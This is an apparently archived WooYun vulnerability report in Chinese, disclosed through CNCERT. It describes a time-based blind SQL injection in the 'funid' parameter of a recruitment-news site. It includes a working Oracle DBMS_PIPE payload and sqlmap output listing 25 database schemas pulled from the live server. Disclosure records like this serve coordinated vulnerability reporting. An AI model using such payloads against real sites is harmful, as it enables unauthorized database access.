wybug_title: 招考资讯网某处SQL时间盲注一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-13：	细节已通知厂商并且等待厂商处理中									2015-08-14：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-08-24：	细节向核心白帽子及相关领域专家公开									2015-09-03：	细节向普通白帽子公开									2015-09-13：	细节向实习白帽子公开									2015-09-28：	细节向公众公开  简要描述： SQL时间盲注 详细说明：  http://**.**.**.**/column2.jsp?funid=0&colid=18480funid参数存在时间盲注....   漏洞证明：  
[15:49:16] [INFO] resuming back-end DBMS 'oracle' [15:49:16] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: funid (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: funid=0 AND 3566=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(88)||CHR(111)||CHR(97),5)&colid=18480---[15:49:18] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[15:49:18] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[15:49:18] [INFO] fetching database (schema) names[15:49:18] [INFO] fetching number of databases[15:49:18] [WARNING] time-based comparison requires larger statistical model, please wait..............................[15:49:39] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] n25[15:50:14] [INFO] retrieved: CTXSYS[15:52:59] [INFO] retrieved: HR[15:54:03] [INFO] retrieved: MDSYS[15:55:59] [INFO] retrieved: ODM[15:57:13] [INFO] retrieved: ODM_MTR[16:00:08] [INFO] retrieved: OE[16:00:57] [INFO] retrieved: OLAPSYS[16:03:39] [INFO] retrieved: ORDSYS[16:05:58] [INFO] retrieved: OUTLN[16:08:09] [INFO] retrieved: PM[16:09:07] [INFO] retrieved: QS[16:09:49] [INFO] retrieved: QS_CBADM[16:12:30] [INFO] retrieved: QS_CS[16:14:23] [INFO] retrieved: QS_ES[16:16:11] [INFO] retrieved: QS_OS[16:18:18] [INFO] retrieved: QS_WS[16:20:19] [INFO] retrieved: RMAN[16:21:46] [INFO] retrieved: SCOTT[16:23:48] [INFO] retrieved: [16:24:07] [ERROR] invalid character detected. retrying..[16:24:07] [WARNING] increasing time delay to 6 seconds SH[16:25:10] [INFO] retrieved: SYS[16:26:37] [INFO] retrieved: SYSTEM[16:29:11] [INFO] retrieved: VCM[16:30:55] [ERROR] invalid character detected. retrying..[16:30:55] [WARNING] increasing time delay to 7 seconds S[16:31:28] [INFO] retrieved: WKSYS[16:33:57] [INFO] retrieved: WMSYS[16:36:29] [INFO] retrieved: XDBavailable databases [25]:[*] CTXSYS[*] HR[*] MDSYS[*] ODM[*] ODM_MTR[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] QS[*] QS_CBADM[*] QS_CS[*] QS_ES[*] QS_OS[*] QS_WS[*] RMAN[*] SCOTT[*] SH[*] SYS[*] SYSTEM[*] VCMS[*] WKSYS[*] WMSYS[*] XDB

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-14 17:06 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给天津分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
